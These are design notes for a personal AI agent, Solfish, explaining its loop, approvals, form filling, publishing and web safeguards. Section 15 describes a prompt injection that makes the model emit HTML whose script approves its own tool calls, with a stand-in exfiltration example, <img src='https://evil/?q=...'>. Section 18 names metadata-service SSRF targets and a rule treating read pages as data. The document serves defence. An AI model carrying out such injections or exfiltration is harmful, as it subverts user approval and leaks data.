# Design notes

Why Solfish is built the way it is. Each section is a decision, the alternatives, and the
trade-off.

## 1. A hand-written loop instead of a framework

The Anthropic SDK ships a tool runner, and frameworks like LangChain go further. Solfish writes
the loop itself (`agent.py`, about 150 lines) because the loop is where an agent's behaviour
is decided: when to stop, what happens on a refusal, how errors reach the model, when a human
is asked. Owning it keeps all of that visible and testable. The cost is handling every
`stop_reason` myself, which is also the point.

## 2. The history is append-only

The loop only ever appends: the model's full response (including thinking blocks), then the
tool results. It never trims, rewrites or reorders earlier turns. Two reasons:

- **Prompt caching** is a prefix match. Any edit to an earlier turn invalidates the cache for
  everything after it. With auto-caching on, each step of the loop reads the previous step
  from cache, which is visible in the trace as `cache_read` tokens.
- **Thinking blocks** must be passed back unchanged for the model to keep its reasoning across
  tool calls.

When a turn is interrupted mid-tool-call, the next turn *appends* "interrupted" results
instead of deleting the dangling call (`_close_dangling_tool_calls`). A test asserts that every
request's history is a prefix of the next one.

## 3. Prompt layout for caching

Order is `tools → system → messages`. Tools are sorted by name so the block is byte-identical
every request. The system prompt is two blocks: a stable block (persona + skill instructions,
with a cache breakpoint) and a per-session memory snapshot after it. The current time is
**not** in the prompt (it would break the cache every request); the model calls `current_time`
when it needs it.

## 4. Tools: one Pydantic model, two jobs

Each tool's parameters are a Pydantic model. `model_json_schema()` becomes the `input_schema`
sent to the API, and `model_validate()` checks what the model sends back. Schema and
validation can't drift apart.

Tool calls never raise into the loop. Invalid arguments, unknown tool names, `ToolError`s and
unexpected exceptions all become `tool_result` blocks with `is_error: true`, so the model can
read the message and correct itself (a test covers the model forgetting a required field).
Large outputs are truncated before they reach the context.

## 5. Skills keep the core general

A skill is `name + instructions + tools`. The loop, registry and CLI don't know what a job
application is. Adding a capability means writing one module and registering it in
`skills/__init__.py`. This is the seam where MCP servers will plug in as well: an MCP server's
tools become one more skill.

## 6. Human approval for side effects

Tools that write or delete are marked `needs_approval`. The loop asks the approver (a `y/N`
prompt in the CLI) before running them, and a refusal goes back to the model as an error
result, so it can ask the user what to do instead. Read-only tools run freely.

## 7. Memory: simple on purpose

Memory is a SQLite table of short notes. The 20 most recent are shown in the system prompt at
session start; older ones are found with keyword search (`recall`). This is deliberately not a
vector store yet: with tens or hundreds of notes, keyword search plus the model choosing good
keywords works, and it's transparent. Embedding search is the upgrade path once recall
quality shows up as a problem in evals.

## 8. Evals grade end state

The eval tasks (`evals/tasks.json`) check what the agent *did*, not what it *said*: rows in
the database, which tools were called, whether a duplicate was created. Wording varies run to
run; the end state shouldn't. Each run reports pass rate, tokens and cost per task, so a
prompt or tool change can be judged on numbers.

## 9. Model settings

- **DeepSeek by default, in Anthropic format.** `deepseek-flash` is the best price/quality
  for daily use (about $0.30 / $1.20 per million input / output tokens, cache hits $0.006).
  DeepSeek serves an Anthropic-compatible endpoint, so the loop keeps the anthropic SDK and
  message format, and moving to `deepseek-v4-pro` or back to Claude is a config change
  (`SOLFISH_MODEL`, `SOLFISH_BASE_URL`), not a rewrite.
- Thinking is on with effort `high` (configurable). With tools, DeepSeek requires thinking to
  be sent back unchanged, which the append-only history already does.
- **Compatibility gaps, handled in the loop.** DeepSeek ignores `tool_result.is_error`, so a
  failed tool's content also starts with `Error:`; otherwise the model could read an error as
  a normal result. It ignores `cache_control` too, but caches prefixes automatically, so the
  layout in section 3 still pays off and shows up as `cache_read` tokens.
- Server-side refusal fallback (`fallbacks: "default"`) is a Claude beta, off by default. With
  `fallbacks=True` the loop uses the beta endpoint, and if the main model declines, the API
  retries on another model in the same call.
- Non-streaming requests with `max_tokens=16000`; streaming is on the roadmap for the web UI.

## 10. Résumé: never written in place; the master changes through pull requests

`build_resume` copies the résumé repo to a temp dir, writes the tailored `.tex` there and
compiles it, so the class file and fonts resolve by relative path exactly as in the real repo,
and the master copy can never be overwritten by the agent. Outputs land in the workspace.

At first the master résumé was read-only, full stop. But keeping it current (a new project, a
sharper line) is exactly the work I want to hand off, so `propose_resume_change` changes it the
way a colleague would: a pull request.

- **A worktree, not my checkout.** The change is made in a temporary `git worktree` on the
  latest `origin/main`, so my working copy and any uncommitted edits are never touched, and the
  agent works from what is actually on GitHub.
- **Built and page-checked before it is pushed.** Every changed file is compiled and must come
  out at one page; a committed PDF (`resume-en.pdf`) is rebuilt and committed with its source so
  they never disagree. A proposal that doesn't fit never leaves the machine.
- **No approval prompt; the merge is the approval.** Pushing a `solfish/<name>` branch changes
  nothing I send out, and closing the PR undoes it. Asking first would mean reviewing the same
  diff twice, once in a worse viewer. This is the one side-effecting tool without
  `needs_approval`, on purpose.
- **Revisions land in the same PR.** Proposing again under the same name builds on that branch.
- **Only tracked `.tex` files.** The repo holds ignored local drafts (a future target résumé
  that must never be published); the tools refuse to read or write anything git doesn't track,
  so those never reach the model, let alone a commit.
- **Languages stay in sync by instruction.** The English and Chinese résumés must carry the same
  facts in the same order, so the skill tells the model to change both in one proposal.

The GitHub token only needs pull requests on that one repo; pushing uses the repo's own git
credentials. Without a token the branch is still pushed and the reply carries a link to open
the PR. Two guards matter more than they look:

- **Shell escape off.** The model writes the LaTeX, and `\write18` would let LaTeX run shell
  commands. XeLaTeX runs with `-no-shell-escape`.
- **Page count is fed back.** The résumé must fit on one page; the tool reads the page count
  from the log and tells the model to cut and rebuild. A deterministic check beats asking the
  model to estimate length.

The instructions forbid inventing experience. Tailoring means reordering and rewording what's
there; a gap goes back to the user.

## 11. Publishing: approve once, then run without the model

Posts are rows (`draft → scheduled → published | failed`). Approval happens at
`schedule_post`; `solfish publish-due` then publishes what's due with no model call, so cron
can run it cheaply and predictably. Letting the model wake up and decide to post would be the
wrong place for autonomy: what to post is a judgement call made with the user; when to post is
a timestamp.

Each platform has a `Publisher` (`post → Delivery`). Most Chinese platforms have no posting
API for individuals, and unattended browser automation against them breaks often and risks the
account, so the default publisher is an **outbox**: a folder with the text and media, ready to
upload. A platform that does have an API is one function in `PUBLISHERS`. Failures are stored on
the post, not lost.

Three things keep an approved post honest once publishing is real:

- **The approval shows the stored post.** The prompt is built by code from the database, not
  from what the model says it is about to do. Editing a scheduled post sends it back to draft,
  so what goes out is what was approved.
- **A post is claimed before the platform is touched** (`publishing`, by a conditional UPDATE).
  Overlapping cron runs can't both get it. A crash, or a timeout on the final request
  (`MaybePublished`), leaves it there on purpose: only a person can tell whether it went out,
  and retrying a public post is worse than asking.
- **`published` means live.** A post that still needs the user to press something waits in
  `handoff` until they confirm it.

**Handoff, the one exception to staying out of the browser.** Uploading images and retyping text
was the slow part of the outbox, so `solfish handoff <id>` fills the 小红书 or 知乎 page in a
visible browser and stops. The risk that ruled out automation came from running unattended and
at volume, so this runs only when the user starts it, one post at a time, and presses publish
themselves; a scheduled time just sends a reminder. As with forms (section 13), the agent never
presses the final button, and here no code path exists for it at all. It doesn't imitate human
typing or work around verification: anything unexpected stops it, with no retry, and the outbox
folder is still there. It runs as its own process with its own browser profile, because
Playwright's sync API is tied to one thread and `serve` runs each turn on a new one.

The blog is mine, so it could publish directly, but it doesn't: the site refuses to hold a
service key, and an agent with an admin login could change anything. Instead a database function
adds drafts through a token that can't do anything else, and I publish from `/admin`, where the
preview shows the real rendering. The function has no status parameter, so that limit is
structural, not a rule the client is trusted to follow.

X and LinkedIn are the platforms that publish unattended. LinkedIn gives self-serve apps no
refresh token, so its token is renewed by hand every 60 days; a post that hits an expired token
fails with a message saying so. X uses OAuth 1.0a user tokens, which don't expire. X charges about 13x more for a post with a link, so the
approval prompt says so. Moving the link to a reply was rejected: it would likely be billed the
same and makes the post worse.

Platform limits (小红书 title ≤ 20 characters, X ≤ 280 weighted, so about 140 Chinese characters)
are checked in code when a draft is saved, so the model gets an error it can fix instead of a
post that fails later.

## 12. Research: grounded and paged

Papers come from the arXiv API (no key). Full text comes from arXiv's HTML rendering, stripped
to text (formulas kept as their LaTeX `alttext`) and served in pages of 15k characters: a whole
paper would be truncated by the 20k result limit, and paging lets the model read only as far as
it needs. The library is a table, so "what have I read about X" is a query over real records,
and the instructions require arXiv ids for every claim about a paper.

## 13. Forms: the model never sees the secrets, and never submits

Arrival cards and sign-up forms are JavaScript apps with dynamic dropdowns, so plain HTTP is
not enough: the forms skill drives a visible Chromium through Playwright (an optional
dependency, so the core stays small). The user watches it fill, and its persistent
browser profile in `~/.solfish/browser/` keeps logins between sessions.

The model works with field numbers, not CSS selectors. `read_form` tags each visible field with
`data-solfish="<n>"` and describes it by its label; `fill_form` targets those numbers, so the
model never writes selectors that break on the next page redesign. Each field is filled and read
back on its own, so one bad value (an option that doesn't exist, with the closest matches
suggested) doesn't stop the rest.

Personal details live in a `profile` table. Values marked sensitive are masked everywhere the
model can see them, including what a filled field reads back. The model writes `{{passport_no}}`
and the tool fills in the real value locally, just before typing it into the page, so a
passport number never shows up in a request to the model provider or in a trace. That only
works if the value never went through the chat in the first place, so sensitive values are set
from the terminal (`solfish profile set <key> --sensitive`, read with `getpass`).

The agent can click buttons, but not the last one. `click_button` exists for multi-step forms
(Next, Continue, Add another traveller); each click asks for approval, and afterwards the field
numbers are discarded, so the model has to `read_form` the new step instead of filling stale
numbers. Buttons whose text or name says submit, confirm, pay, register, reset and the like
(English, Malay and Chinese) are refused in code, and `read_form` marks them up front.
Submitting a government form is a legal declaration, it can't be taken back, and it usually
sits behind a captcha anyway; the review before it is where the human catches what the model
couldn't know. The list errs towards refusing: a false "this is final" costs the user one
click, a missed one could send a form they haven't checked. Approval is the second layer for
buttons the list doesn't recognise.

## 14. Sessions: one agent, many channels

The terminal is one way in; a local web page, Telegram and a menu bar window are the others.
None of them should know how the loop works, and a conversation started on one should be
continuable on another, so the seam is the two callbacks the loop already had: listeners
(events out) and the approver (a yes/no in).

- **Stored the way it's built.** Sessions are rows in SQLite, and after each turn only the new
  messages are written (`SessionStore.sync`). Since the loop never rewrites history, "the tail
  since last time" is always the right diff. SDK blocks are stored as the dicts the API accepts
  back, thinking signatures included, so a restored session sends the same prefix and the
  provider's cache still hits. A test asserts that prefix holds across a save and restore.
- **One manager, many channels.** `SessionManager` keeps one agent per session and runs each
  turn on a worker thread, one turn at a time per session (a second message gets `Busy`, not a
  tangled history). Every event is broadcast to every subscriber, so a turn started from the
  phone shows up live in the browser. Errors become `error` events: a worker thread has no caller
  to raise to.
- **Approvals any channel can answer.** The approver posts an `approval_request` event and
  blocks the agent's thread until some channel calls `resolve(id, allow)`. No answer in ten
  minutes counts as no, which is the safe default for a side effect nobody is watching.
- **Stopping is cooperative.** `cancel` takes effect at the next tool boundary: the model's
  pending calls are not run, and the next turn answers them with "interrupted" results, the same
  path as Ctrl-C in the terminal. A tool already running finishes; killing a thread mid-write
  would be worse than waiting.

## 15. The web UI: a page that renders text strangers influenced

`solfish serve` is FastAPI, Server-Sent Events and one plain JavaScript file, with no build
step. SSE rather than WebSockets because the traffic is one-way: events stream down, and the
few things the page sends (a message, a decision, a stop) are ordinary POSTs. One stream carries
every session's events, so the sidebar can show which sessions are working or waiting for an
approval while you read another.

The design problem is the page, not the server. It displays what the model wrote, and the model
reads job posts, web pages and papers, so a page could carry a prompt injection that makes the
model reply with HTML. On this page a script could approve its own tool calls. Several layers
stop that:

- **No raw HTML.** marked renders Markdown, but HTML in the model's text is escaped and shown
  as text. DOMPurify sanitises the result anyway.
- **Strict CSP.** Scripts only from this server and the pinned CDN, no inline handlers, and
  images only from this server, so an injected `<img src="https://evil/?q=...">` can't send data
  out. (In testing, DOMPurify's own parsing tripped an inline handler that the CSP blocked. That
  is why there is more than one layer.)
- **Token, then a cookie.** Only 127.0.0.1 is bound. `serve` prints a link with a random token
  (kept in `~/.solfish/token`). The first visit turns it into an `HttpOnly`, `SameSite=Strict`
  cookie and redirects, so the token leaves the address bar and another site can't send requests
  that carry it. Scripts can send it as a Bearer header.
- **Workspace files.** Downloads resolve inside the workspace or 404. PDFs, images and plain
  text open inline. Anything else, HTML and SVG included, downloads as an attachment with
  `nosniff`, so a model-written HTML file can't run on this origin.

Replies arrive whole when the turn ends: requests aren't streamed yet (section 9). Thinking and
tool calls already appear as they happen, which is where the waiting is.

## 16. Telegram: the phone as a channel

Telegram is the channel for when I'm away from the laptop, so it has to work without a public
address. That means long polling (`getUpdates`), not a webhook. The bot runs inside
`solfish serve` as one more `SessionManager` subscriber. That's what lets it approve a request
from a session started in the browser: approval requests from **every** session go to the phone,
labelled with the session they come from. Everything else follows the session the chat is
currently on.

- **No bot framework.** Solfish uses a handful of Bot API methods. Calling them with httpx2 is
  about as much code as configuring a framework, and it stays readable. Errors never include the
  exception text, because the request URL contains the bot token.
- **One chat id.** This bot can write files and send email, so it answers exactly one chat and
  ignores everyone else silently, buttons included. With no id configured it only tells the
  sender their id, so setup needs no other tool.
- **One message per turn.** A turn is a single "Working…" message, edited as each tool runs and
  closed with the step count, followed by the answer. Edits are rate-limited much less than new
  messages, and the chat doesn't fill up with tool noise. Rendering runs on its own thread, so a
  slow Telegram call never holds up the agent.
- **Plain text.** Replies are sent without `parse_mode`. Telegram's MarkdownV2 rejects a whole
  message over one unescaped character, and an answer that fails to send is worse than one that
  shows raw `**`. Long answers are split at line breaks under the 4096-character limit.
- **Messages go through Telegram's servers.** Sensitive form values still never enter the chat
  (section 13), so nothing changes there. The forms skill opens its browser on the Mac, so from
  the phone it's only good for "fill it now, check it when I'm home".
- `publish-due` (from cron) also reports what it published to the chat, so scheduled posts no
  longer go out silently.

## 17. Spark: conversations Solfish starts

Talking to an assistant usually means bringing it a question, and after a while I run out of
questions. The spark skill turns that around: Solfish texts me first, several times a day at
random, like a friend would. The point is for it to get to know me, help me grow, and find
things worth discussing and learning together.

- **Four kinds of spark.** One specific point about an *interest*; how a *goal* is going (with a
  next step or a question to reflect on); a *follow-up* on something I said in the last three
  days; a *check-in* on my day, at most once a day. Kinds with nothing behind them are skipped,
  and the rest are drawn at random by weight.
- **Work hours change the mix, not the schedule.** On weekdays 9–18 I still get sparks, but no
  check-ins, and the opener is told I'll answer later, so it's something worth coming back to.
- **Random, but polite.** Each day gets a fresh random plan (5–8 times between 9:00 and 23:00 by
  default, both settings). A planned time only sends if the last spark was at least 45 minutes
  ago, doubling for each spark in a row I ignored (up to 12 hours), and if I haven't written
  anything in the last 30 minutes: a spark switches the Telegram chat to its own session, which
  would cut into a conversation in progress. Missed times collapse into one. Answering resets it.
- **A seeded session, not a special mode.** A spark is an ordinary session whose history starts
  with `user: "[spark] ..."` and `assistant: <opener>`. The history still starts with a user turn
  and only grows, so my reply is just the next turn: same loop, same caching, resumable from any
  channel. The assistant turn is stored as text blocks, the shape the loop stores every turn in.
- **The opener is one call without tools.** Three sentences don't need the loop, and without
  tools the model can't wander off. It sees the card, the memory snapshot, what I said in the
  last few days (my own typed messages only), and its last five openers so it doesn't repeat
  itself. Local time goes in the user message, not the system prompt.
- **Friend in conversation, assistant at work.** The skill's instructions tell the model to talk
  like a curious friend when I'm chatting or learning (react, share a view, one follow-up
  question, not an interrogation) and to stay brief when I've asked it to do something. It saves
  what it learns: interests and goals with `add_interest`, other facts with `remember`.
- **Picking is plain arithmetic.** Interests and goals score weight times freshness (72 hours to
  rest after a spark). Saying a topic again adds weight; muting takes it out. Everything about
  *when* and *what* is testable with a fixed clock and a seeded random generator; only the
  wording needs the model.
- **Not yet:** news, papers and posts as material for sparks (they need real sources, and the
  opener must never invent them), and learning which kinds of spark I answer.

## 18. Web: a search API, and only public addresses

Most useful questions need something newer than the model's training data, or a page the user
links to: a job post, a company's about page. Reading a page needs no service: `fetch_url` gets
it, strips it to text with the same parser as the research skill, and serves it in pages of 15k
characters.

Search does need one. The options I weighed:

- **Scraping a search engine's HTML** (DuckDuckGo's no-JavaScript page) is free and keyless, but
  it is fragile, against the spirit of the site, and from my machine it already answered with an
  empty bot check. From a cloud IP it would be worse.
- **Tavily** has a free tier (1,000 searches a month, no card), is built for agents, and returns
  a clean snippet per hit. It is the default.
- **Brave** dropped its free plan for a monthly credit that needs a card.
- **SearXNG** is free forever and aggregates many engines, at the cost of running one more
  service. When `SOLFISH_SEARXNG_URL` is set it wins, so moving off Tavily is one line of config.

Two guards:

- **Only public addresses.** The model chooses the URL, and a page it read can suggest one. On
  the server, `127.0.0.1:8765` is the Solfish web UI and `169.254.169.254` is the cloud metadata
  service, which hands out credentials. Every host is resolved and must be globally routable,
  and redirects are followed by hand so each hop is checked before it is requested. (A host
  that resolves differently between the check and the request could still slip through; the
  stakes didn't justify pinning the connection to the checked address.)
- **Pages are data, not instructions.** The skill tells the model to treat anything it reads as
  information and to report, not follow, instructions it finds. That is a soft guard; the hard
  ones are elsewhere: every side-effecting tool still needs my approval, and the web UI never
  renders model output as HTML (section 15). Reading is not gated, since it changes nothing.

Size and type limits keep a single fetch cheap: text types only (no PDFs or images yet), 5 MB
at most, 20 seconds.

## 19. Reading: check first, then write the note

I read every day and keep short public notes on my site. Writing them in a web form is the step
that makes the habit slip, and a note is only worth keeping if what I understood is right. So the
skill is a workflow more than a pair of tools: tell Solfish what I read, it checks my
understanding (what is right, what is off, what is missing, and a question or two to test it),
then drafts the note in my voice and posts it once I approve the text.

- **The model never writes the book's words.** A quote goes in only if I gave it the exact
  words. A model recalling a quote from memory is the easiest way to publish a fabrication
  under someone else's name.
- **The token can add notes and nothing else.** As with blog drafts (section 11), the site
  holds no service key. A database function checks the token against a stored hash and can
  only add a note to a book that already exists; it can't edit or delete notes, add books, or
  touch articles. Unlike a draft, a note is public at once, so Solfish posts through a route on
  the site that also expires the cached reading pages, and the tool needs my approval with the
  note shown exactly as it will appear.
- **A timeout is not a failure.** If the site doesn't answer, the note may be live anyway, so
  the error says to check the page instead of retrying.
- **No eval tasks.** The eval runner approves every tool call, so an eval for this skill would
  post to my real site. The offline tests cover the HTTP side; the check-first behaviour is in
  the instructions and gets tried by hand.

## 20. Résumé review: the projects write the résumé

A résumé goes stale in the weeks I'm busiest building. Every Sunday evening Solfish reads what I
shipped and proposes the update as a pull request, the same way as any other résumé change
(section 10). It's a Telegram conversation: if I want a line kept or reworded, I reply, and the
same pull request gets the revision.

- **Git history is the source.** `recent_project_activity` fetches each clone in
  `SOLFISH_PROJECTS_DIR` and reads my commits that reached its default branch in the window:
  merge commits carry pull request titles, the merged commits their full messages, and each
  active project adds the top of its README. Commits are matched on my email or my name, since a
  merge made on GitHub is authored with a noreply address.
- **Every active project gets a fair share.** The first run read about 70,000 characters of
  activity and a flat cut kept only the first two projects alphabetically, which dropped the one
  that mattered most. Now clones of the same repo count once, projects come most recent first,
  and the space is split evenly.
- **It runs inside the server, not on a schedule of its own.** The bot that already runs all day
  starts the review (`SOLFISH_REVIEW_AT`, e.g. "sun 20:00"), the way it starts sparks, so there is
  no extra process and nothing to miss when my laptop is off. The last run is stored: after
  downtime the review runs once, looking back over the whole gap. `/review` starts one by hand;
  `solfish resume-review` runs one unattended from a shell.
- **Only test builds skip approval.** A review session pre-approves `build_resume`, which only
  writes to the local workspace, so a page-count check doesn't wait on a button press at 8 pm.
  Everything else still asks. `propose_resume_change` needs no approval because merging is the
  approval, and a fixed name means unreviewed weeks pile up in one pull request.
- **No invented numbers.** The instructions allow only facts from the activity or the résumé;
  where a number would help, the line goes in without it and a `% TODO(确认)` comment says what to
  confirm. The first real run did exactly that, and asked before dropping a section to fit one page.
- **Least access on the server.** Each private repo it reads has its own read-only deploy key; the
  résumé repo's key is the only one that can push. The Chinese résumé embeds a photo that stays
  off the server: a blank image of the same size stands in, which gives the same layout and page
  count, and the Chinese PDF is never committed.
- **No eval tasks.** An eval run would push to the real résumé repo. The offline tests build real
  git repos with dated commits and drive the bot and its schedule; the judgement (what is worth a
  line) gets read in the pull request.
